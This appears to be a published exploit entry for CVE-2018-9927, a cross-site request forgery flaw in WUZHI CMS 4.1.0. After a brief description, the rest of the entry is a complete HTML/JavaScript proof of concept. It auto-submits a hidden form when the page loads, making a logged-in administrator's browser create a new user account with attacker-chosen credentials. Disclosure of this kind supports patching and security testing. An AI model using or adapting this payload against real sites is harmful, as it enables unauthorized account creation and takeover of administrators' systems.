# Exploit Author: taoge
# Vendor Homepage: https://github.com/wuzhicms/wuzhicms
# Software Link: https://github.com/wuzhicms/wuzhicms
# Version: 4.1.0 
# CVE : CVE-2018-9927
  
An issue was discovered in WUZHI CMS 4.1.0.（https://github.com/wuzhicms/wuzhicms/issues/128）
There is a CSRF vulnerability that can add a user account via index.php?m=member&f=index&v=add.
After the administrator logged in, open the csrf exp page.
  
  
<html><body>
<script type="text/javascript">
function post(url,fields)
{
var p = document.createElement("form");
p.action = url;
p.innerHTML = fields;
p.target = "_self";
p.method = "post";
document.body.appendChild(p);
p.submit();
}
function csrf_hack()
{
var fields;
 
 
fields += "<input type=&#039;hidden&#039; name=&#039;info[username]&#039; value=&#039;hack123&#039; />";
fields += "<input type=&#039;hidden&#039; name=&#039;info[password]&#039; value=&#039;hacktest&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;info[pwdconfirm]&#039; value=&#039;hacktest&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;info[email]&#039; value=&#039;taoge@5ecurity.cn&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;info[mobile]&#039; value=&#039;&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;modelids[]&#039; value=&#039;10&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;info[groupid]&#039; value=&#039;3&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;pids[]&#039; value=&#039;0&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;pids[]&#039; value=&#039;0&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;pids[]&#039; value=&#039;0&#039; />"; 
fields += "<input type=&#039;hidden&#039; name=&#039;pids[]&#039; value=&#039;0&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;avatar&#039; value=&#039;&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;islock&#039; value=&#039;0&#039; />"; 
fields += "<input type=&#039;hidden&#039; name=&#039;sys_name&#039; value=&#039;0&#039; />"; 
fields += "<input type=&#039;hidden&#039; name=&#039;info[birthday]&#039; value=&#039;&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;info[truename]&#039; value=&#039;&#039; />";  
fields += "<input type=&#039;hidden&#039; name=&#039;info[sex]&#039; value=&#039;0&#039; />"; 
fields += "<input type=&#039;hidden&#039; name=&#039;info[marriage]&#039; value=&#039;0&#039; />"; 
 
 
var url = "http://127.0.0.1/www/index.php?m=member&f=index&v=add&_su=wuzhicms&_menuid=30&_submenuid=74&submit=taoge";
post(url,fields);
}
window.onload = function() { csrf_hack();}
</script>
</body></html>

